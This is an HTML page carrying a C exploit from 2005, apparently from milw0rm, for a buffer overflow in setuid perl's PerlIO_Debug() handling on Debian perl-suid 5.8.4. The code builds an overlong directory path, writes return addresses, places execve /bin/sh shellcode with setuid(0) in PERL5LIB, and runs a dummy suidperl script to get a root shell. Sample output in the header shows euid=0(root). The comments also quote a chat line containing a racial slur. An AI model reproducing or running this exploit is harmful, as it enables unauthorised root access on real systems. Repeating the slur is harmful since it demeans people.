<html><head><title>Setuid perl PerlIO_Debug() overflow</title></head><pre>/*
 * Copyright Kevin Finisterre
 *
 * Setuid perl PerlIO_Debug() overflow
 *
 * Tested on Debian 3.1 perl-suid 5.8.4-5 
 *
 * (11:07:20) *corezion:* who is tha man with tha masta plan?
 * (11:07:36) *corezion:* a nigga with a buffer overrun
 * (11:07:39) *corezion:* heh
 * (of course that is to the tune of http://www.azlyrics.com/lyrics/drdre/niggawittagun.html)
 *
 * cc -o ex_perl2 ex_perl2.c -std=c99
 * 
 * kfinisterre@jdam:~$ ./ex_perl2
 * Dirlen: 1052
 * Charlie Murphy!!!@#@
 * sh-2.05b# id
 * uid=1000(kfinisterre) gid=1000(kfinisterre) euid=0(root) 
 * 
 */

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;strings.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

int main(int *argc, char **argv)
{
	int len = 23;
 	int count = 5;
	char malpath[10000];
	char tmp[256];
	char *filler;
	char *ptr;

	unsigned char code[] = 
	/*
	  0xff-less execve() /bin/sh by anathema &lt;anathema@hack.co.za&gt;
	  Linux/IA32 0xff-less execve() shellcode.  
	 */
        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;

        // setuid(0) - fix for redhat based machines
	&quot;\x31\xdb&quot;                      // xorl         %ebx,%ebx
	&quot;\x8d\x43\x17&quot;                  // leal         0x17(%ebx),%eax
	&quot;\xcd\x80&quot;                      // int          $0x80

	&quot;\x89\xe6&quot;                          /* movl %esp, %esi          */
	&quot;\x83\xc6\x30&quot;                      /* addl $0x30, %esi         */
	&quot;\xb8\x2e\x62\x69\x6e&quot;              /* movl $0x6e69622e, %eax   */
	&quot;\x40&quot;                              /* incl %eax                */
	&quot;\x89\x06&quot;                          /* movl %eax, (%esi)        */
	&quot;\xb8\x2e\x73\x68\x21&quot;              /* movl $0x2168732e, %eax   */
	&quot;\x40&quot;                              /* incl %eax                */
	&quot;\x89\x46\x04&quot;                      /* movl %eax, 0x04(%esi)    */
	&quot;\x29\xc0&quot;                          /* subl %eax, %eax          */
	&quot;\x88\x46\x07&quot;                      /* movb %al, 0x07(%esi)     */
	&quot;\x89\x76\x08&quot;                      /* movl %esi, 0x08(%esi)    */
	&quot;\x89\x46\x0c&quot;                      /* movl %eax, 0x0c(%esi)    */
	&quot;\xb0\x0b&quot;                          /* movb $0x0b, %al          */
	&quot;\x87\xf3&quot;                          /* xchgl %esi, %ebx         */
	&quot;\x8d\x4b\x08&quot;                      /* leal 0x08(%ebx), %ecx    */
	&quot;\x8d\x53\x0c&quot;                      /* leal 0x0c(%ebx), %edx    */
	&quot;\xcd\x80&quot;                          /* int $0x80                */;


	chdir(&quot;/tmp/&quot;);

	// do one less char than usual for RedHat 
	filler = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/&quot;;
	
	for (int x=0; x&lt;4; x=x+1)
	{
		mkdir(filler, 0777);
		chdir(filler);
		// do one less char than usual for RedHat 
		count = count + 255;		
	}

        memset(tmp,0x41,len);  
	count = count + len;

        ptr = tmp+len;
        ptr = putLong (ptr, 0xbffffb6a); // frame 11 ebp
        ptr = putLong (ptr, 0xbffffb6a); 
        ptr = putLong (ptr, 0xbffffb6a);

	strcat(tmp, &quot;/&quot;);
	mkdir(tmp, 0777);
	chdir(tmp);

	printf (&quot;Dirlen: %d\n&quot;, count); 

	FILE *perlsploit;
	char perldummyfile[] = {
                &quot;#!/usr/bin/sperl5.8.4\n&quot;
                &quot;# \n&quot;
                &quot;# Be proud that perl(1) may proclaim: \n&quot;
                &quot;#   Setuid Perl scripts are safer than C programs ...\n&quot;
                &quot;# Do not abandon (deprecate) suidperl. Do not advocate C wrappers. \n&quot;
        };

        if(!(perlsploit = fopen(&quot;take_me.pl&quot;,&quot;w+&quot;))) {
                printf(&quot;error opening file\n&quot;);
                exit(1);
        }
        fwrite(perldummyfile,sizeof(perldummyfile)-1,1,perlsploit);
        fclose(perlsploit);

	getcwd(malpath, 10000);
	strcat(malpath, &quot;/&quot;);
	strcat(malpath, &quot;take_me.pl&quot;);
	printf(&quot;Charlie Murphy!!!@#@\n&quot;);

	chmod(malpath,0755);
        setenv(&quot;PERLIO_DEBUG&quot;, &quot;/tmp/ninjitsu&quot;, 1);
	setenv(&quot;PERL5LIB&quot;, code, 1);
	execv(malpath,(char *) NULL);

}
/*
 * put a address in mem, for little-endian
 *
 */
char*
putLong (char* ptr, long value)
{
    *ptr++ = (char) (value &gt;&gt; 0) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 8) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 16) &amp; 0xff;
    *ptr++ = (char) (value &gt;&gt; 24) &amp; 0xff;

    return ptr;
}

// milw0rm.com [2005-02-07]</pre></html>